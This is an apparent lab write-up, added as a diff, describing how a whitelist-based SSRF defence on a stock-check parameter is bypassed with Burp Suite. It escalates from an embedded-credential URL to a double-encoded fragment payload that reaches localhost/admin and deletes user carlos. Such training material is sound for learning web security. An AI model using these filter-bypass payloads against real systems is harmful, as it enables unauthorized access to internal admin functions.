@@ -1,1 +1,57 @@
+Description:
+The application includes a stock check feature that fetches data from an internal system.
+An anti-SSRF defense is implemented using a whitelist, but it can be bypassed.
 
+Objective:
+Access admin panel:
+-http://localhost/admin
+-Delete user: carlos
+
+Tools Used:
+Burp Suite (Proxy, Repeater)
+
+Exploitation Steps:
+1️-Intercept Request
+-Navigate to a product page
+-Click Check Stock
+-Intercept the request using Burp Suite
+
+2️-Send to Repeater
+-Forward the request to Burp Repeater
+-Locate parameter:
+stockApi
+
+3️-Analyze Filtering
+-Try:
+http://127.0.0.1/
+
+Blocked — application validates hostname against whitelist
+
+4️-Test URL Parsing Behavior
+-Try:
+http://username@stock.weliketoshop.net/
+
+Accepted — indicates support for embedded credentials
+
+5️-Test Fragment Injection
+-Try:
+http://username#@stock.weliketoshop.net/
+
+Blocked
+
+6️-Bypass with Double Encoding
+-Encode # → %23 → %2523
+-Try:
+http://username%2523@stock.weliketoshop.net/
+
+Server returns error → indicates parsing confusion
+
+7️-Final Exploit
+-Craft payload:
+-http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
+
+Result:
+-Bypassed whitelist-based SSRF protection
+-Forced server to interpret request as localhost
+-Accessed admin functionality
+-Successfully deleted user carlos
